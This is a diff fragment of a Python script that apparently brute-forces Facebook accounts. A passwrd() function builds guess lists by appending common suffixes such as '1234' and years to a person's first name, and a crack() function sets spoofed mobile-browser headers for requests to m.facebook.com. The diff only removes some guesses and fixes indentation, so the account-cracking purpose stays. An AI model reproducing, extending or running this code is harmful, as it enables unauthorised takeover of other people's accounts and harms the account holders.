@@ -588,19 +588,13 @@ def passwrd():
                     pwv.append(frs+'1234')
                     pwv.append(frs+'12345')
                     pwv.append(frs+'123456')
-                    pwv.append(frs+'qwery')
-                    pwv.append(frs+'1998')
                     pwv.append(frs+'2007')
                     pwv.append(frs+'2006')
                     pwv.append(frs+'2005')
                     pwv.append(frs+'2020')
-                    pwv.append(frs+'0000')
                     pwv.append(frs+'123123')
                     pwv.append(frs+'1122')
                     pwv.append(frs+'112233')
-                    pwv.append(frs+'1111')
-                    pwv.append(frs+'2222')
-                    pwv.append(frs+'2000')
                     pwv.append(frs+'2211')
                     pwv.append(frs+'00')
                     pwv.append(frs+'19971997')
@@ -616,19 +610,13 @@ def passwrd():
                     pwv.append(frs+'1234')
                     pwv.append(frs+'12345')
                     pwv.append(frs+'123456')
-                    pwv.append(frs+'qwery')
-                    pwv.append(frs+'1998')
                     pwv.append(frs+'2007')
                     pwv.append(frs+'2006')
                     pwv.append(frs+'2005')
                     pwv.append(frs+'2020')
-                    pwv.append(frs+'0000')
                     pwv.append(frs+'123123')
                     pwv.append(frs+'1122')
                     pwv.append(frs+'112233')
-                    pwv.append(frs+'1111')
-                    pwv.append(frs+'2222')
-                    pwv.append(frs+'2000')
                     pwv.append(frs+'2211')
                     pwv.append(frs+'00')
                     pwv.append(frs+'19971997')
@@ -680,7 +668,7 @@ def crack(idf,pwv):
             koki+=' m_pixel_ratio=2.625; wd=412x756'
             heade = {'authority': 'm.facebook.com',
     'method': 'GET',
-	'scheme': 'https',
+    'scheme': 'https',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
     'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
     'cache-control': 'max-age=0',
